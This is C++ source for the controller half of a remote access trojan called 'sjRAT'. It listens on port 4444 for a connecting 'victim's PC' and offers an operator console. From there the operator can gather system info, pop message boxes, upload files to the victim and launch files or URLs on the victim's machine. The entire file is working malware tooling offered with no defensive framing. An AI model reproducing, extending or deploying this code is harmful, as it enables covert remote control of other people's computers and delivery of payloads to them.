#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#pragma comment(lib, "Ws2_32.lib")

void SendAndReceive(SOCKET client, std::string command)
{
    send(client, command.c_str(), command.size(), 0);
    char buff[1024];
    int bytesReceived = recv(client, buff, sizeof(buff), 0);
    if (bytesReceived > 0) {
        buff[bytesReceived] = '\0';
        printf("[*] %s\n", buff);
    }
}

void help_menu()
{
    printf("==============HELP-MENU==============\n");
    printf("sysinfo - see information about victim's PC\n\n");
    printf("msgbox - summon MessageBox on victim's PC\n\n");
    printf("upload <file> - send file to victim's PC\n\n");
    printf("execute <file/url> - lauch file or open url\n\n");
    printf("help - see this message\n\n");
    printf("exit - exit sjRAT and terminate client session\n\n");
    printf("=====================================\n");
}

void SendFile(SOCKET client, const std::string& filePath)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        printf("Failed to open file\n");
        return;
    }

    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::string fileSizeStr = std::to_string(fileSize);

    send(client, fileSizeStr.c_str(), fileSizeStr.size(), 0);
    Sleep(500);

    char buffer[1024];
    int bytesRead = 0;
    while (bytesRead < fileSize)
    {
        int remainingBytes = fileSize - bytesRead;
        int bytesToRead = remainingBytes < 1024 ? remainingBytes : 1024;
        file.read(buffer, bytesToRead);
        int bytesSent = send(client, buffer, bytesToRead, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            printf("Error sending file\n");
            return;
        }
        bytesRead += bytesSent;
    }

    file.close();

    char response[1024];
    int bytesReceived = recv(client, response, sizeof(response), 0);
    if (bytesReceived > 0)
    {
        response[bytesReceived] = '\0';
        printf("[*] %s\n", response);
    }
}

int main(int argc, char* argv[])
{
    char ip_addr[] = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // to public connections | inet_addr("127.0.0.1") <- connections only from local network
    // addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(port); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL); // socket that listens for connetions
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr)); // bind address to the socket
    printf("[*] Listening for connections...\n");
    listen(sListen, SOMAXCONN); // start listen for connections

    SOCKET client;
    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
    if (client == 0)
    {
        printf("Failed to accept client's connection\n%d\n", WSAGetLastError());
        exit(1);
    } else {
        // Get connected client IP
        struct sockaddr_in addr_in;
        int addrSize = sizeof(addr_in);
        getpeername(client, (struct sockaddr*)&addr_in, &addrSize);
        const char* clientIP = inet_ntoa(addr_in.sin_addr);
        printf("[+] New connection from %s!\n", clientIP);
        
        std::string command;
        while (true) 
        {
            std::cout << "sj> ";
            std::getline(std::cin, command);

            if (command == "msgbox") {
                SendAndReceive(client, command);
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                SendAndReceive(client, command);
            }
            else if (command.substr(0, 6) == "upload") {
                std::string filePath = command.substr(7);
                SendFile(client, filePath);
            }
            else if (command.substr(0, 7) == "execute") {
                SendAndReceive(client, command);
            }

            else if (command == "help") {
                help_menu();
            }
            else if (command == "exit" || command == "quit" || command == "bye") {
                SendAndReceive(client, command.c_str());
                closesocket(client);
                system("pause");
                exit(0);
            }
        }
    }

    system("pause");
}